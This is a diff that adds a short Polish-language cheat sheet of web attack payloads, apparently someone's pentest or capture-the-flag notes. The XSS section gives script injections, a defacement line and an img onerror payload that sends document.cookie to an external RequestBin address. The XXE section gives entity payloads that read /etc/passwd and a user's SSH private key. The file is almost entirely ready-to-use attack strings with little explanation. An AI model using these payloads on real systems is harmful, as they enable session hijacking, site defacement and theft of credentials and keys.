@@ -1,0 +1,18 @@
+1) XSS
+      • Wstrzykniecie w formularzu odsylanym do servera (burp) 
+            ▪ <script>alert(window.location.hostname);</script>
+            ▪ <script>alert(document.cookie);</script>
+            ▪ <script>document.getElementById('<nazwa np. banneru>').innerHTML="I am a hacker"</script>
+      • Wstrzykniecie kodu wysylajacego ciasteczko do zewnetrznego servera
+            ▪ https://requestbin.com 
+            ▪ Https://temp-mail.org/pl/10minutemail 
+            ▪ <img src=x onerror=this.src="<ADRES Z REQESTBIN>/?c="+document.cookie>
+
+2) XXE
+      • Wstrzykniecie w formularzu odsylanym do servera (burp)
+            ▪ <?xml version="1.0"?>
+                  → <!DOCTYPE root [<!ENTITY read SYSTEM 'file:////etc/passwd'>]>
+                  → <!DOCTYPE root [<!ENTITY read SYSTEM 'file:////home/<user>/.ssh/id_rsa'>]>	{[3]-SSH}
+            ▪ <root>&read;</root>
+
+
